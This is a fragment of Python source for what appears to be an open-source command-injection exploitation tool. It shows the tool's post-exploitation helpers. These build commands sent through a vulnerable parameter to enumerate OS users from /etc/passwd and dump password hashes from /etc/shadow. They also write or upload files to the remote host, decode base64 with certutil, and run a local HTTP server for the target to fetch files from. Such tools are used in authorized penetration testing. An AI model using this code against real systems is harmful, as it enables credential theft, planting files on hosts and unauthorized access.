    info_msg = "Fetching content of the file '" + settings.SHADOW_FILE + "' "
    info_msg += "in order to enumerate operating system users password hashes. "  
    print(settings.print_info_msg(info_msg))

  def print_single_os_cmd_msg(self, cmd):
    info_msg =  "Executing the user-supplied command: '" + cmd + "'."
    print(settings.print_info_msg(info_msg))

"""
Print users enumeration.
"""
def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
  # Windows users enumeration.
  if settings.TARGET_OS == "win":
    try:
      if sys_users and any(account in sys_users for account in settings.DEFAULT_WIN_USERS):
        sys_users = "".join(str(p) for p in sys_users).strip()
        sys_users_list = re.findall(r"(.*)", sys_users)
        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
        sys_users_list = ' '.join(sys_users_list.split())
        sys_users_list = sys_users_list.split()
        if len(sys_users_list) != 0 :
          if settings.VERBOSITY_LEVEL == 0 and _:
            print(settings.SINGLE_WHITESPACE)
          info_msg = "Identified operating system"
          info_msg += " user" + ('s', '')[len(sys_users_list) == 1] 
          info_msg += " [" + str(len(sys_users_list)) + "]:"
          print(settings.print_bold_info_msg(info_msg))
          # Add infos to logs file.   
          output_file = open(filename, "a")
          if not menu.options.no_logging:
            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
          output_file.close()
          count = 0
          for user in range(0, len(sys_users_list)):
            count = count + 1
            # if menu.options.privileges:
            #   cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
            #   if alter_shell:
            #     cmd = escape_single_quoted_cmd(cmd)
            #   cmd = "cmd /c " + cmd 
            #   from src.core.injections.results_based.techniques.classic import cb_injector
            #   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
            #   check_privs = cb_injector.injection_results(response, TAG, cmd)
            #   check_privs = "".join(str(p) for p in check_privs).strip()
            #   check_privs = re.findall(r"(.*)", check_privs)
            #   check_privs = "".join(str(p) for p in check_privs).strip()
            #   check_privs = check_privs.split()
            #   if "Admin" in check_privs[0]:
            #     is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " admin user"
            #     is_privileged_nh = " is admin user "
            #   else:
            #     is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " regular user"
            #     is_privileged_nh = " is regular user "
            # else :
            is_privileged = is_privileged = ""
            print(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL)
            # Add infos to logs file.   
            output_file = open(filename, "a")
            if not menu.options.no_logging:
              if count == 1 :
                output_file.write("\n")
              output_file.write("(" +str(count)+ ") '" + sys_users_list[user] + is_privileged + "'\n" )
            output_file.close()
      else:
        # print(settings.SINGLE_WHITESPACE)
        warn_msg = "It seems that you don't have permissions to enumerate operating system users."
        print(settings.print_warning_msg(warn_msg))
    except TypeError:
      pass
    except IndexError:
      # print(settings.SINGLE_WHITESPACE)
      warn_msg = "It seems that you don't have permissions to enumerate operating system users."
      print(settings.print_warning_msg(warn_msg))
      pass
      
  # Unix-like users enumeration.    
  else:
    try:
      if sys_users:
        sys_users = "".join(str(p) for p in sys_users).strip()
        if len(sys_users.split(settings.SINGLE_WHITESPACE)) <= 1 :
          sys_users = sys_users.split("\n")
        else:
          sys_users = sys_users.split(settings.SINGLE_WHITESPACE)
        # Check for appropriate '/etc/passwd' format.
        if len(sys_users) % 3 != 0 :
          warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
          print(settings.print_warning_msg(warn_msg))
          sys_users = " ".join(str(p) for p in sys_users).strip()
          print(sys_users)
          output_file = open(filename, "a")
          if not menu.options.no_logging:
            output_file.write("      " + sys_users)
          output_file.close()
        else:  
          sys_users_list = []
          for user in range(0, len(sys_users), 3):
             sys_users_list.append(sys_users[user : user + 3])
          if len(sys_users_list) != 0 :
            if settings.VERBOSITY_LEVEL == 0 and _:
              print(settings.SINGLE_WHITESPACE)
            info_msg = "Identified operating system"
            info_msg += " user" + ('s', '')[len(sys_users_list) == 1] 
            info_msg += " [" + str(len(sys_users_list)) + "]:"
            print(settings.print_bold_info_msg(info_msg))
            # Add infos to logs file.   
            output_file = open(filename, "a")
            if not menu.options.no_logging:
              output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
            output_file.close()
            count = 0
            for user in range(0, len(sys_users_list)):
              sys_users = sys_users_list[user]
              sys_users = ":".join(str(p) for p in sys_users)
              count = count + 1
              fields = sys_users.split(":")
              fields1 = "".join(str(p) for p in fields)
              # System users privileges enumeration
              try:
                if not fields[2].startswith("/"):
                  raise ValueError()
                if menu.options.privileges:
                  if int(fields[1]) == 0:
                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " root user "
                    is_privileged_nh = " is root user "
                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " system user "
                    is_privileged_nh = " is system user "
                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " anonymous user "
                      is_privileged_nh = " is anonymous user "
                    elif int(fields[1]) == 60002:
                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " non-trusted user "
                      is_privileged_nh = " is non-trusted user "   
                    else:
                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " regular user "
                      is_privileged_nh = " is regular user "
                  else :
                    is_privileged = ""
                    is_privileged_nh = ""
                else :
                  is_privileged = ""
                  is_privileged_nh = ""
                print(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "' " + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
                # Add infos to logs file.   
                output_file = open(filename, "a")
                if not menu.options.no_logging:
                  if count == 1 :
                    output_file.write("\n")
                  output_file.write("(" +str(count)+ ") '" + fields[0] + "' " + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
                output_file.close()
              except ValueError:
                if count == 1 :
                  warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is not in the "
                  warn_msg += "appropriate format. Thus, it is expoted as a text file." 
                  print(settings.print_warning_msg(warn_msg))
                sys_users = " ".join(str(p) for p in sys_users.split(":"))
                print(sys_users) 
                output_file = open(filename, "a")
                if not menu.options.no_logging:
                  output_file.write("      " + sys_users)
                output_file.close()
      else:
        # print(settings.SINGLE_WHITESPACE)
        warn_msg = "It seems that you don't have permissions to read the '" 
        warn_msg += settings.PASSWD_FILE + "'."
        print(settings.print_warning_msg(warn_msg))  
    except TypeError:
      pass
    except IndexError:
      # print(settings.SINGLE_WHITESPACE)
      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
      warn_msg += settings.PASSWD_FILE + "' to enumerate operating system users." 
      print(settings.print_warning_msg(warn_msg))
      pass

"""
Print users enumeration.
"""
def print_passes(sys_passes, filename, _, alter_shell):
  if sys_passes == "":
    sys_passes = settings.SINGLE_WHITESPACE
    sys_passes = sys_passes.replace(settings.SINGLE_WHITESPACE, "\n").split()
    if len(sys_passes) != 0 :
      if settings.VERBOSITY_LEVEL == 0 and _:
        print(settings.SINGLE_WHITESPACE)
      info_msg = "Identified operating system"
      info_msg += " user" + ('s', '')[len(sys_passes) == 1] 
      info_msg += " password hashes [" + str(len(sys_passes)) + "]:"
      print(settings.print_bold_info_msg(info_msg))
      # Add infos to logs file.   
      output_file = open(filename, "a")
      if not menu.options.no_logging:
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
      output_file.close()
      count = 0
      for line in sys_passes:
        count = count + 1
        try:
          if ":" in line:
            fields = line.split(":")
            if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
              print("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
              # Add infos to logs file.   
              output_file = open(filename, "a")
              if not menu.options.no_logging:
                if count == 1 :
                  output_file.write("\n")
                output_file.write("(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
              output_file.close()
        # Check for appropriate '/etc/shadow' format.
        except IndexError:
          if count == 1 :
            warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
            warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
            print(settings.print_warning_msg(warn_msg))
          print(fields[0])
          output_file = open(filename, "a")
          if not menu.options.no_logging:
            output_file.write("      " + fields[0])
          output_file.close()
    else:
      warn_msg = "It seems that you don't have permissions to read the '" 
      warn_msg += settings.SHADOW_FILE + "' file."
      print(settings.print_warning_msg(warn_msg))

"""
Print single OS command
"""
def print_single_os_cmd(cmd, shell):
  if len(shell) > 1:
    _ = "'" + cmd + "' execution output"
    print(settings.print_retrieved_data(_, shell))
  else:
    err_msg = common.invalid_cmd_output(cmd)
    print(settings.print_error_msg(err_msg)) 

"""
Quote provided cmd
"""
def quoted_cmd(cmd):
  cmd = "\"" + cmd + "\""
  return cmd

"""
Add new "cmd /c"
"""
def add_new_cmd(cmd):
  cmd = "cmd /c " + cmd
  return cmd

"""
Escape single quoted cmd
"""
def escape_single_quoted_cmd(cmd):
  cmd = cmd.replace("'","\\'")
  return cmd

"""
Find filename
"""
def find_filename(dest_to_write, content):
  fname = os.path.basename(dest_to_write)
  tmp_fname = fname + "_tmp"
  # _ = settings.FILE_WRITE
  if settings.TARGET_OS == "win":
    # _ = settings.FILE_WRITE_WIN
    cmd = settings.WIN_FILE_WRITE_OPERATOR  + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
  else:
    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + tmp_fname
  return fname, tmp_fname, cmd

"""
Decode base 64 encoding
"""
def win_decode_b64_enc(fname, tmp_fname):
  cmd = settings.CERTUTIL_DECODE_CMD + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + fname.replace("\\","\\\\") 
  return cmd

"""
Add command substitution on provided command
"""
def add_command_substitution(cmd):
  cmd = "echo $(" + cmd + ")"
  return cmd

"""
Remove command substitution on provided command
"""
def remove_command_substitution(cmd):
  cmd = cmd.replace("echo $(","").replace(")","")
  return cmd

def remove_parenthesis(cmd):
  cmd = cmd.replace("(","").replace(")","")
  return cmd 

"""
Write the file content
"""
def write_content(content, dest_to_write):
  content = quoted_cmd(content)
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_FILE_WRITE_OPERATOR  + dest_to_write.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
  else:
    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + dest_to_write 
  return cmd

"""
Delete filename
"""
def delete_tmp(tmp_fname):
  cmd = settings.WIN_DEL + tmp_fname.replace("\\","\\\\") 
  return cmd

"""
Check if file exists.
"""
def check_file(dest_to_upload):
  if settings.TARGET_OS == "win":
    cmd = settings.FILE_LIST_WIN + dest_to_upload.replace("\\","\\\\")
  else:
    cmd = settings.FILE_LIST + dest_to_upload
    cmd = add_command_substitution(cmd)
  return cmd

"""
Change directory
"""
def change_dir(dest_to_write):
  dest_to_write = dest_to_write.replace("\\","/")
  path = os.path.dirname(dest_to_write)
  path = path.replace("/","\\")
  cmd = "cd " + path 
  return cmd

"""
File content to read.
"""
def file_content_to_read():
  file_to_read = menu.options.file_read.encode(settings.DEFAULT_CODEC).decode()
  info_msg = "Fetching content of the file: '"  
  info_msg += file_to_read + "'."
  print(settings.print_info_msg(info_msg))
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_FILE_READ + file_to_read.replace("\\","\\\\")
  else:
    if settings.EVAL_BASED_STATE:
      cmd = "(" + settings.FILE_READ + file_to_read + ")"
    else:
      cmd = settings.FILE_READ + file_to_read
  return cmd, file_to_read

"""
File read status
"""
def file_read_status(shell, file_to_read, filename):
  if shell:
    _ = "Fetched file content"
    print(settings.print_retrieved_data(_, shell))
    output_file = open(filename, "a")
    if not menu.options.no_logging:
      info_msg = "Extracted content of the file '"
      info_msg += file_to_read + "' : " + shell + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
    output_file.close()
  else:
    warn_msg = "It seems that you don't have permissions "
    warn_msg += "to read the content of the file '" + file_to_read + "'."
    print(settings.print_warning_msg(warn_msg))

"""
Check upload/write destination
"""
def check_destination(destination):
  if menu.options.file_write:
    where = menu.options.file_write
  else:
    where = menu.options.file_upload
  if os.path.split(destination)[1] == "" :
    _ = os.path.split(destination)[0] + "/" + os.path.split(where)[1]
  elif os.path.split(destination)[0] == "/":
    _ = "/" + os.path.split(destination)[1] + "/" + os.path.split(where)[1]
  elif os.path.split(destination)[0] == "\\":
    _ = "\\" + os.path.split(destination)[1] + "\\" + os.path.split(where)[1]
  else:
    _ = destination
  return _

"""
Write the content of the file
"""
def check_file_to_write():
  file_to_write = menu.options.file_write.encode(settings.DEFAULT_CODEC).decode()
  if not os.path.exists(file_to_write):
    err_msg = "It seems that the provided local file '" + file_to_write + "' does not exist."
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", settings.SINGLE_WHITESPACE) for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
    if settings.TARGET_OS == "win":
      import base64
      content = base64.b64encode(content.encode(settings.DEFAULT_CODEC)).decode()
  else:
    warn_msg = "It seems that '" + file_to_write + "' is not a file."
    print(settings.print_warning_msg(warn_msg))
    print(settings.SINGLE_WHITESPACE)

  dest_to_write = check_destination(destination=menu.options.file_dest)
  info_msg = "Trying to write the content of the file '"  
  info_msg += file_to_write + "' on a remote directory '" + dest_to_write + "'."
  print(settings.print_info_msg(info_msg))
  return file_to_write, dest_to_write, content

"""
File write status
"""
def file_write_status(shell, dest_to_write):
  if shell:
    info_msg = "The file has been successfully created on remote directory: '" + dest_to_write + "'." 
    print(settings.print_bold_info_msg(info_msg))
  else:
    warn_msg = "It seems that you don't have permissions to write files on the remote directory '" + dest_to_write + "'."
    print(settings.print_warning_msg(warn_msg))

"""
File upload procedure.
"""
def check_file_to_upload():
  file_to_upload = menu.options.file_upload.encode(settings.DEFAULT_CODEC).decode()
  try:
    _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
  except _urllib.error.HTTPError as err_msg:
    warn_msg = "It seems that the '" + file_to_upload + "' file, does not exist. (" +str(err_msg)+ ")"
    print(settings.print_warning_msg(warn_msg))
    raise SystemExit()
  except ValueError as err_msg:
    err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
    print(settings.print_critical_msg(err_msg))
    raise SystemExit() 
  dest_to_upload = check_destination(destination=menu.options.file_dest)
  info_msg = "Trying to upload the file from '"  
  info_msg += file_to_upload + "' on a remote directory '" + dest_to_upload + "'."
  print(settings.print_info_msg(info_msg))
  # Execute command
  cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
  return cmd, dest_to_upload

"""
File upload status.
"""
def file_upload_status(shell, dest_to_upload):
  if shell:
    info_msg = "The file has been successfully uploaded on remote directory '" + dest_to_upload + "'."
    print(settings.print_bold_info_msg(info_msg))
  else:
    warn_msg = "It seems that you don't have permissions to upload files on the remote directory '" + dest_to_upload + "'."
    print(settings.print_warning_msg(warn_msg))

"""
Check if defined "--file-upload" option.
"""
def file_upload():
  if not re.match(settings.VALID_URL_FORMAT, menu.options.file_upload):
    # if not menu.options.file_dest.endswith("/"):
    #   menu.options.file_dest = menu.options.file_dest + "/"
    # Check if not defined URL for upload.
    while True:
      message = "Do you want to enable an HTTP server? [Y/n] > "
      enable_HTTP_server = common.read_input(message, default="Y", check_batch=True)         
      if enable_HTTP_server in settings.CHOICE_YES:

        # Check if file exists
        if not os.path.isfile(menu.options.file_upload):
          err_msg = "The '" + menu.options.file_upload + "' file, does not exist."
          sys.stdout.write(settings.print_critical_msg(err_msg) + "\n")
          raise SystemExit()

        # Setting the local HTTP server.
        if settings.LOCAL_HTTP_IP == None:
          while True:
            message = "Please enter your interface IP address > "
            ip_addr = common.read_input(message, default=None, check_batch=True)
            # check if IP address is valid
            ip_check = simple_http_server.is_valid_ipv4(ip_addr)
            if ip_check == False:
              err_msg = "The provided IP address seems not valid."  
              print(settings.print_error_msg(err_msg))
              pass
            else:
              settings.LOCAL_HTTP_IP = ip_addr
              break

        # Check for invalid HTTP server's port.
        if settings.LOCAL_HTTP_PORT < 1 or settings.LOCAL_HTTP_PORT > 65535:
          err_msg = "Invalid HTTP server's port (" + str(settings.LOCAL_HTTP_PORT) + ")." 
          print(settings.print_critical_msg(err_msg))
          raise SystemExit()
        
        http_server = "http://" + str(settings.LOCAL_HTTP_IP) + ":" + str(settings.LOCAL_HTTP_PORT)
        info_msg = "Setting the HTTP server on '" + http_server + "/'. "  
        print(settings.print_info_msg(info_msg))
        menu.options.file_upload = http_server + menu.options.file_upload
        simple_http_server.main()
        break

      elif enable_HTTP_server in settings.CHOICE_NO:
        if not re.match(settings.VALID_URL_FORMAT, menu.options.file_upload):
          err_msg = "The '" + menu.options.file_upload + "' is not a valid URL. "
          print(settings.print_critical_msg(err_msg))
          raise SystemExit()
        break  
      elif enable_HTTP_server in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(enable_HTTP_server)  
        pass

"""
Check for wrong flags
"""
def check_wrong_flags():
  if settings.TARGET_OS == "win":
    if menu.options.is_root :
      warn_msg = "Swithing '--is-root' to '--is-admin' because the "
      warn_msg += "target has been identified as Windows."
      print(settings.print_warning_msg(warn_msg))
    if menu.options.passwords:
      warn_msg = "The '--passwords' option, is not yet supported Windows targets."
      print(settings.print_warning_msg(warn_msg))  
    if menu.options.file_upload :
      warn_msg = "The '--file-upload' option, is not yet supported Windows targets. "
      warn_msg += "Instead, use the '--file-write' option."
      print(settings.print_warning_msg(warn_msg))  
      raise SystemExit()
  else: 
    if menu.options.is_admin : 
      warn_msg = "Swithing the '--is-admin' to '--is-root' because "
      warn_msg += "the target has been identified as Unix-like. "
      print(settings.print_warning_msg(warn_msg))

"""
Define python working dir (for windows targets)
"""
def define_py_working_dir():
  if settings.TARGET_OS == "win" and menu.options.alter_shell:
    while True:
      message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER 
      message += "' as Python working directory on the target host? [Y/n] > "
      python_dir = common.read_input(message, default="Y", check_batch=True)
      if python_dir in settings.CHOICE_YES:
        break
      elif python_dir in settings.CHOICE_NO:
        message = "Please provide a custom working directory for Python (e.g. '" 
        message += settings.WIN_PYTHON_INTERPRETER + "') > "
        settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
        break
      else:
        common.invalid_option(python_dir)  
        pass
    settings.USER_DEFINED_PYTHON_DIR = True

# eof